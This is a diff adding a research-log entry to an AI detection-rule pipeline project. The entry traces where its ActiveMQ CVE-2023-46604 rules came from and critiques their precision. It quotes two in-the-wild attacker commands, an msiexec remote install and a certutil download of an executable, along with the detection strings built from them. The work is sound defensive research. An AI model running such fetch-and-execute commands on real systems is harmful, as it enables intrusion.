@@ -6923,3 +6923,39 @@ paper-based (similarity) evaluation cannot see.** This is the strongest argument
 rule 2/3, re-test on the same recording, and show specific detection of the malicious msiexec with the noise gone —
 demonstrating human-in-the-loop correction *and* real-log validation in one story. Also: enabling Sysmon network
 logging in the VM would let the network rules be tested.
+
+## 2026-10-26 — Real-log demo, where the ActiveMQ rules came from: web search was on; the Metasploit page was read but nothing from it reached the rules; rules 2 and 3 came from two web pages, not the blog
+
+**Correction to the 2026-10-23 entry (real-log demo).** That entry says the ActiveMQ input was "an independent
+analysis blog … not the attack recipe, to avoid circularity", and that "the assistant identified the right
+behaviour". Checked today against the run's own saved record (`data/sessions.json`, session `0832d618`,
+`pipeline_metadata.web_enrichment`; local, gitignored), read directly, no new code. `[DEMO]`, descriptive.
+
+- **Web search was on** (the web app has it on; every evaluation run has it off). One query (`CVE-2023-46604 Rapid7
+  Analysis: CVE-2023-46604 exploit detection indicators of compromise`), 5 results: the blog itself (dropped as the
+  case's own page) and **4 pages read**: Rapid7's post on exploitation seen in the wild, Huntress's post, a copy of
+  the Rapid7 post on another site, and **the Metasploit Framework module for this CVE** (its GitHub page). **The user
+  ran the attack in their VM with that Metasploit module** (user, 2026-10-26).
+- **Nothing from the Metasploit page was passed on.** The digest proposed 10 items: **8 kept, all from the Rapid7
+  in-the-wild post (2) or Huntress (6)**, none from the Metasploit page or the copy; 2 dropped (no string found in
+  their page), plus one string dropped from a kept item. Only kept items are appended to the text the attack-vector
+  and analysis stages read (`stage_web_enrich.py`). The Metasploit link is in all 4 rules' `references` because
+  `stage_generate.py` hands the rule writer every input page and every page the web step read, and the prompt asks
+  for all of them. Not ruled out: the model knowing the module from its training.
+- **Rules 2 and 3 came from the web pages, not the blog.** Rule 2's `msiexec` / `/q /i` matches the string kept from
+  the Rapid7 in-the-wild post (`cmd.exe /c "start msiexec /q /i hxxp://…/m4.png`). Rule 3's `certutil` / `-urlcache` /
+  `-split` / `-f` are the four words of one string kept from Huntress (`certutil -urlcache -split -f http://…/x86.exe`),
+  split into an OR so that any one word fires: the 1,470. Neither string is in the blog: the digest drops strings the
+  report already contains, and the web search's copy of the blog (19,083 characters, `data/web_cache.jsonl`) contains
+  neither `msiexec` nor `certutil`.
+- **The corrected reading:** the input was not the attack tool, and the tool's page did not shape the rules. But the
+  rules came from the blog **plus** two posts on attacks seen in the wild, and they target what those attackers did
+  after exploitation (an MSI run by msiexec, certutil downloads). The recording is of the Metasploit module; whether
+  it contains those behaviours was not checked. "The right behaviour" holds for the in-the-wild attacks only.
+- **Two more readings from the rule files (not tested):** rule 4's detection is **only `DestinationPort: 80`**,
+  although its description promises "known C2 domains and IP addresses"; once network events are captured it would
+  match any connection to port 80. Rule 2's `msiexec -Embedding` (called suspicious on 10-23) is also how the Windows
+  Installer service runs ordinary installs; none of the 14 matches is shown to be the attack.
+- **Also:** "context for the analyst" (why web search stays in the app, 2026-10-18) does not keep it out of the rules.
+  In the app its kept findings go to the stages that write them (on 2026-10-18 the rules used 167 web strings).
+- Updated: CH5 demo note; the user's meeting notes (local). No scored result changes.
